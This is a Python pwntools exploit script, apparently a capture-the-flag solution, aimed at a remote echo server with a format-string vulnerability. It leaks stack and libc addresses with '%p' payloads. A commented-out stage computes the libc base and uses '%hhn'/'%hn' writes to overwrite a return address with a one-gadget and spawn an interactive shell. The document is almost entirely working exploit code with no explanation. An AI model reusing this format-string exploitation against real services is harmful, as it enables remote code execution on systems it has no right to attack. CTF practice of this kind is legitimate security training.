from pwn import *
import time
elf = ELF("./server")
libc=elf.libc
context.binary=elf
context.log_level='DEBUG'
gadget=0xe58c3
#target=process([elf.path])
target=remote('echoserver.darkarmy.xyz',32768)
def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

payload="%17$p\n%7$p"
sa("> ",payload)
'''
payload="%c"*7+"%"+str(0xc8-7)+"c"+"%hhn"+"%"+str(0x15a-0xc8)+"c"+"%7$hhn"+"%17$p"+"%7$p"
sa("> ",payload)
leaks=target.recv(0x178)
libc_base=int(leaks[0x15e:0x15e+12],16)-0x21b97
libc_gadget=libc_base+gadget
stack_leak=int(leaks[0x15e+12+2:0x15e+12+2+12],16)%0x10000
print(hex(libc_gadget))
print(hex(stack_leak))
n1=stack_leak+0x22
payload="%c"*7+"%"+str(0xc8-7)+"c"+"%hhn"
payload+="%c"*(17-9)+"%"+str(n1-0xc8-8)+"c"+"%hn"
n2=(libc_gadget%0x10000)
n3=((libc_gadget%0x1000000)>>16)+0x100
n1=n1%0x100
payload+="%"+str(0x15a-n1)+"c%7$hhn"
sa("> ",payload)
payload="%c"*7+"%"+str(0xe8-7)+"c"+"%hhn"
payload+="%"+str(n3-0xe8)+"c%45$hhn"
payload+="%"+str(n2-n3)+"c%7$hn"
sa("> ",payload)
target.recvuntil("Bye")
'''
target.interactive()
